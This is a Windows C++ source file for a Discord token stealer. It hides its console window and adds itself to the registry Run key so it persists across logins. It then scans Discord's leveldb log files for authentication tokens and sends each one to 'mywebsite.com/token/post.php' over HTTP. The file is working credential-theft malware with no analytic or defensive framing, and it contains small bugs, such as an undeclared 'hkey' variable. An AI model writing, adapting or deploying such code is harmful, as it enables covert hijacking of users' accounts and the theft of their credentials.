#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <string>

#include <Wininet.h>
#pragma comment(lib, "wininet.lib")

using namespace std;

vector<string> split(const string& str, const string& delim) {
	vector<string> keys;
	size_t prev = 0, pos = 0;
	do {
		pos = str.find(delim, prev);
		if (pos == string::npos)
			pos = str.length();

		string key = str.substr(prev, pos - prev);
		if (!key.empty())
			keys.push_back(key);
		prev = pos + delim.length();

	} while (pos < str.length() && prev < str.length());

	return keys;
}

string exec(const char* cmd){
	char buffer[128];
	std::string result = "";
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) throw std::runtime_error("popen() failed!");
	try {
		while (fgets(buffer, sizeof buffer, pipe) != NULL) {
			result += buffer;
		}
	}
	catch (...) {
		_pclose(pipe);
		throw;
	}
	_pclose(pipe);
	return result;
}

string replace_all(string subject, const string& search, const string& replace) {
	size_t pos = 0;
	while ((pos = subject.find(search, pos)) != string::npos) {
		subject.replace(pos, search.length(), replace);
		pos += replace.length();
	}
	return subject;
}

void post_token(string token) {
	HINTERNET wbNet = InternetOpenA("Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", 1, NULL, NULL, NULL);
	HINTERNET retFile;
	string rtn;
	if (wbNet) {
		retFile = InternetOpenUrlA(wbNet, ("http://mywebsite.com/token/post.php?t="+token).c_str(), NULL, NULL, NULL, NULL);
		if (retFile) {
			char buffer[2000];
			DWORD bytesRead;
			do {
				InternetReadFile(retFile, buffer, 2000, &bytesRead);
				rtn.append(buffer, bytesRead);
				memset(buffer, 0, 2000);
			} while (bytesRead);
			InternetCloseHandle(wbNet);
			InternetCloseHandle(retFile);
		}
	}
	InternetCloseHandle(wbNet);
}

int main(int arg_count, char* argv) {
	FreeConsole();
	
	HKEY key = NULL;
	LONG v1 = RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ,&key);
	LONG v2 = RegSetValueEx(hkey, "CockAndBallTorture", 0, REG_SZ, (BYTE*)argv[0], (string(argv[0]).size() + 1) * sizeof(wchar_t));
	
	string path = "%appdata%\\discord\\Local Storage\\leveldb";
	
	auto files = split(exec("cd %appdata%/discord/Local Storage/leveldb && dir /n /b *"), "\n");
	for (auto file : files) {
		if (file.find(".log") != string::npos) {
			auto lines = split(exec(string("cd %appdata%/discord/Local Storage/leveldb && more "+file).c_str()), "\n");
			for (auto line : lines) {
				if (line.find("token") != string::npos) {
					auto token = split(replace_all(line, "token>\"", ""), "\"")[0];
					post_token(token);
				}
			}
		}
	}
}
